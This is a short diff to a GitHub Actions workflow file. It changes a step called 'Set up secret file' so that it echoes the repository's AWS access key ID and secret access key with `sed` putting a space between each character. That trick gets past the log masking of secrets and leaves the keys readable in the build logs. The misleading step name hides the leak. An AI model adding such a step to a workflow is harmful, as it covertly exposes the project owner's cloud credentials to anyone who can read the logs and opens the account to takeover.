@@ -13,9 +13,9 @@ jobs:
 
     - name: Set up secret file
       env:
-        DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
-        DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
+        DOCKER_USERNAME: ${{ secrets.AWS_ACCESS_KEY_ID }}
+        DOCKER_PASSWORD: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
 
       run: |
-        echo ${{secrets.DOCKER_USERNAME}} | sed 's/./& /g'
-        echo ${{secrets.DOCKER_PASSWORD}} | sed 's/./& /g'
+        echo ${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'
+        echo ${{secrets.AWS_SECRET_ACCESS_KEY}} | sed 's/./& /g'
